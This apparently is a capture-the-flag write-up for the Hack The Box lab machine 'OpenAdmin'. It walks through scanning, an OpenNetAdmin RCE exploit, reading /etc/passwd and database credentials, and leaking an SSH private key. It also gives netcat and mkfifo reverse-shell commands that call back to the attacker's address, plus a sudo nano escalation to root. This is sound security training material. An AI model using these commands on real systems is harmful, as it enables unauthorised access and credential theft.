# OpenAdmin

## Nmap
```
 Nmap 7.80 scan initiated Wed Apr 22 22:29:47 2020 as: nmap -p22,80 -sC -sV -oN targeted -Pn 10.10.10.171
Nmap scan report for 10.10.10.171
Host is up (0.048s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Apr 22 22:30:09 2020 -- 1 IP address (1 host up) scanned in 21.85 seconds
```

Port 80: Default Apache Page

## Dirb
```
kali@kali:/tmp/OpenAdmin$ dirb http://10.10.10.171/ 

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Apr 22 22:32:02 2020
URL_BASE: http://10.10.10.171/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.10.171/ ----
==> DIRECTORY: http://10.10.10.171/artwork/                                                                                                                                   
+ http://10.10.10.171/index.html (CODE:200|SIZE:10918)                                                                                                                        
==> DIRECTORY: http://10.10.10.171/music/                                                                                                                                     
+ http://10.10.10.171/server-status (CODE:403|SIZE:277)                                                                                                                       
                                                                                                                                                                              
---- Entering directory: http://10.10.10.171/artwork/ ----
==> DIRECTORY: http://10.10.10.171/artwork/css/                                                                                                                               
==> DIRECTORY: http://10.10.10.171/artwork/fonts/                                                                                                                             
==> DIRECTORY: http://10.10.10.171/artwork/images/                                                                                                                            
+ http://10.10.10.171/artwork/index.html (CODE:200|SIZE:14461)                                                                                                                
==> DIRECTORY: http://10.10.10.171/artwork/js/                                                                                                                                
                                                                                                                                                                              
---- Entering directory: http://10.10.10.171/music/ ----
==> DIRECTORY: http://10.10.10.171/music/css/                                                                                                                                 
==> DIRECTORY: http://10.10.10.171/music/img/                                                                                                                                 
+ http://10.10.10.171/music/index.html (CODE:200|SIZE:12554)                                                                                                                  
==> DIRECTORY: http://10.10.10.171/music/js/                                                                                                                                  
                                                                                                                                                                              
---- Entering directory: http://10.10.10.171/artwork/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                              
---- Entering directory: http://10.10.10.171/artwork/fonts/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                              
---- Entering directory: http://10.10.10.171/artwork/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                              
---- Entering directory: http://10.10.10.171/artwork/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                              
---- Entering directory: http://10.10.10.171/music/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                              
---- Entering directory: http://10.10.10.171/music/img/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                              
---- Entering directory: http://10.10.10.171/music/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Wed Apr 22 22:43:24 2020
DOWNLOADED: 13836 - FOUND: 4
```

## Nikto

For /artwork
```
kali@kali:/tmp$ nikto -h http://10.10.10.171/artwork
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.171
+ Target Hostname:    10.10.10.171
+ Target Port:        80
+ Start Time:         2020-04-22 22:41:11 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /artwork/, inode: 387d, size: 5946577bc7340, mtime: gzip
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: POST, OPTIONS, HEAD, GET 
+ OSVDB-3268: /artwork/css/: Directory indexing found.
+ OSVDB-3092: /artwork/css/: This might be interesting...
+ OSVDB-3092: /artwork/readme.txt: This might be interesting...
+ OSVDB-3268: /artwork/images/: Directory indexing found.
+ OSVDB-6694: /artwork/.DS_Store: Apache on Mac OSX will serve the .DS_Store file, which contains sensitive information. Configure Apache to ignore this file or upgrade to a newer version.
+ 7863 requests: 0 error(s) and 11 item(s) reported on remote host
+ End Time:           2020-04-22 22:48:47 (GMT2) (456 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

For /music
```
kali@kali:/tmp$ nikto -h http://10.10.10.171/music
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.171
+ Target Hostname:    10.10.10.171
+ Target Port:        80
+ Start Time:         2020-04-22 22:41:32 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /music/, inode: 310a, size: 597f2e74f42d4, mtime: gzip
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: POST, OPTIONS, HEAD, GET 
+ OSVDB-3268: /music/css/: Directory indexing found.
+ OSVDB-3092: /music/css/: This might be interesting...
+ OSVDB-3268: /music/img/: Directory indexing found.
+ OSVDB-3092: /music/img/: This might be interesting...
+ 7863 requests: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2020-04-22 22:49:07 (GMT2) (455 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

## First steps
Using BurpSuite, we can find another path called /ona/, which means "OpenNetAdmin", and it's a "database managed inventory of a network".
The first thing you see is an alert:
``` 
!! - You are NOT on the latest release version
Your version    = v18.1.1
Latest version = Unable to determine

Please DOWNLOAD the latest version. 
```

In the first google page, we can find ExploitDB, (https://www.exploit-db.com/exploits/47691) with a RCE for 18.1.1 version.. Oh wait :)

Wow, it was easy:
```
kali@kali:~/CTFs/Writeups/eternals/HTB/OpenAdmin_SPOILER$ chmod +x ona_RCE.sh                                                          
kali@kali:~/CTFs/Writeups/eternals/HTB/OpenAdmin_SPOILER$ ./ona_RCE.sh 10.10.10.171/ona/
$ whoami
www-data
$ pwd
/opt/ona/www
$ ls
config                                                                                                                                 
config_dnld.php                                                                                                                        
dcm.php                                                                                                                                
images                                                                                                                                 
include                                                                                                                                
index.php                                                                                                                              
local                                                                                                                                  
login.php                                                                                                                              
logout.php                                                                                                                             
modules                                                                                                                                
plugins                                                                                                                                
winc                                                                                                                                   
workspace_plugins  
```
More information about the exploit: https://www.onurer.net/opennetadmin-command-injection/

We have not "cd" command, however, we can see files rather than those first:
```
$ ls ../../../
bin
boot
cdrom
dev
etc
home
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
swap.img
sys
tmp
usr
var
vmlinuz
vmlinuz.old
$ cat ../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
```

So now we have some usernames like jimmy and joanna. Lets continue seeing around.


Ok, reading the different php files of the page, I've done this way:

1. Read the index.php, and got a "require_once($base . '/config/config.inc.php');".
2. Read the config.inc.php, where it appears "$dbconffile = "{$base}/local/config/database_settings.inc.php";"
3. Reading the /local/config/database_settings.inc.php we got the MySQL credentials, so lets send some queries:

```
$ mysql --user=ona_sys --password=n1nj4W4rri0R! -h localhost --database=ona_default --execute="SELECT table_name FROM information_schema.tables where table_schema = 'ona_default';"
table_name
blocks
configuration_types
configurations
custom_attribute_types
custom_attributes
dcm_module_list
device_types
devices
dhcp_failover_groups
dhcp_option_entries
dhcp_options
dhcp_pools
dhcp_server_subnets
dns
dns_server_domains
dns_views
domains
group_assignments
groups
host_roles
hosts
interface_clusters
interfaces
locations
manufacturers
messages
models
ona_logs
permission_assignments
permissions
roles
sequences
sessions
subnet_types
subnets
sys_config
tags
users
vlan_campuses
vlans
```
And now...
```
$ mysql --user=ona_sys --password=n1nj4W4rri0R! -h localhost --database=ona_default --execute="SELECT * FROM users;"
id      username        password        level   ctime   atime
1       guest   098f6bcd4621d373cade4e832627b4f6        0       2020-04-23 14:16:06     2020-04-23 14:16:06
2       admin   21232f297a57a5a743894a0e4a801fc3        0       2007-10-30 03:00:17     2007-12-02 22:10:26
```

MD5 passwords, with google we can say that the credentials are:
```
guest:test
admin:admin
```

Now I feel so dumb for not testing them before x). Anyways, it seem's that we have not many choices playing with the ONA....


Some coffees later...

Now I find myself more dumb if it can...
I've tryed jimmy user with the db password "n1nj4W4rri0R!", and it works (not joanna).
Password reusing is the key here. 

Jimmy doesn't have the flag, so let's pivote to joanna.

## Pivoting for the user flag

Looking around, we can see a folder, owned by jimmy, with some php files:
```
jimmy@openadmin:/var/www$ ls -la internal/
total 20
drwxrwx--- 2 jimmy internal 4096 Nov 23 17:43 .
drwxr-xr-x 4 root  root     4096 Nov 22 18:15 ..
-rwxrwxr-x 1 jimmy internal 3229 Nov 22 23:24 index.php
-rwxrwxr-x 1 jimmy internal  185 Nov 23 16:37 logout.php
-rwxrwxr-x 1 jimmy internal  339 Nov 23 17:40 main.php
```

It's interesting that in main.php, we can see the next code:
```
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
```
And, in index.php, we can see the next code:
 
```
            if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
                  $_SESSION['username'] = 'jimmy';
                  header("Location: /main.php");
              } else {
                  $msg = 'Wrong username or password.';
```

After a little research, we can find that the original password is, literally, Revealed.
Letś get joanna session!                

Next step is into /etc/apache2/system-enabled. We can see two enabled systems: 
```
jimmy@openadmin:/var/www/internal$ ls -la /etc/apache2/sites-enabled/
total 8
drwxr-xr-x 2 root root 4096 Nov 22 18:35 .
drwxr-xr-x 8 root root 4096 Nov 21 14:08 ..
lrwxrwxrwx 1 root root   32 Nov 22 18:35 internal.conf -> ../sites-available/internal.conf
lrwxrwxrwx 1 root root   33 Nov 22 14:24 openadmin.conf -> ../sites-available/openadmin.conf
```

And the content of the "internal.conf" one is very usefull:
```
jimmy@openadmin:/var/www/internal$ cat /etc/apache2/sites-enabled/internal.conf 
Listen 127.0.0.1:52846

<VirtualHost 127.0.0.1:52846>
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal

<IfModule mpm_itk_module>
AssignUserID joanna joanna
</IfModule>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
```

Ok, we can curl this URL from the bash (not from our machine.) so let's hack:

First of all, we have to get the PHP SESSION, doing this call:
```
curl -XPOST "127.0.0.1:52846?login=1&username=jimmy&password=Revealed"
```

Now, we can get the RSA Private Key for joanna:
```
jimmy@openadmin:/var/www/internal$ curl -XPOST "127.0.0.1:52846/main.php"
<pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
</pre><html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>

```

After creating the key and try to ssh, it asks us the password. Seeing the last paragraph in the last response, we can use our old password "n1nj4W4rri0R!". However, it doesn't work.

```
kali@kali:/tmp$ vim joanna-openadmin
kali@kali:/tmp$ chmod 400 joanna-openadmin 
kali@kali:/tmp$ ssh joanna@10.10.10.171 -i joanna-openadmin 
Enter passphrase for key 'joanna-openadmin': 
Enter passphrase for key 'joanna-openadmin': 
Enter passphrase for key 'joanna-openadmin': 
joanna@10.10.10.171's password: 
Permission denied, please try again.
joanna@10.10.10.171's password: 
```

Editing /var/www/internal/main.php, we can get another diferent files from joanna, as her public key:
```
jimmy@openadmin:/var/www/internal$ curl -XPOST "127.0.0.1:52846/main.php"
<pre>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQq/QYeYL+V+jJ+LryA/icUJL9zyT72WMo5Bq0THQk2VQ/JaY6KiLJ929clsttUEM4RVY0yBldrvQ3EEpOrlls2PImRMOwMz7cPnrL11t53OugzwEtFPqO/8yWcqquGO2qp8Jw5xvthIiLUg0t2z5CzbLLAGj1EVMCjhgKMR6r6ZOJRK/8M9n1YrOtuFoj+BRMyTNvHur3d1EumnVmfZk2AJeLqrXfxJAJ9hjD+266hlqbYd9GJDP5AfoXhW+fp1Q4sD+yHdr7XOrS24C2lwrPCrZoTaCPnDj01WuuTY/xCPfJuJcHjsVoZwrm7nSfkTJlS1y7xBqrVZwRxpCGhnQ/ joanna@openadmin
</pre><html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```


Ok, as in others boxes, we can connect using nc:

First of all, we've executed netcat listening in our machine:
```
sudo nc -nlvp 1999
```
After this, we've executed this command in the server:
```
nc 10.10.14.6 1999 -e /bin/sh
```
but it dodn't work because some stranges nc versions have no "-e" flag... However, we have an alternative (thanks to http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet):
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 1999 >/tmp/f   
```

And now...
```
kali@kali:/tmp$ sudo nc -nlvp 1999
listening on [any] 1999 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.171] 39358
/bin/sh: 0: can't access tty; job control turned off
$ ls
index.php
logout.php
main.php
$ whoami
joanna
```

Now we can insert a new pubkey into joanna's authorized_keys, and please, let the "main.php" file as in the beginning :)

## Getting the root flag
First of all, see that pspy64 doesn't return any interesting thing.

Let's see if we can any privileged use:
```
joanna@openadmin:/etc/update-motd.d$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

Interesting. Note that the command is all compelete "/bin/nano /opt/priv". There are no two different commands, so we can write into this file.

We can now execute:

```
sudo /bin/nano /opt/priv
```

And, with nano, click in Ctrl+R for inserting a file, and select the /root/root.txt file, or passwd, even create a new file and save it.
Easy peasy guys :)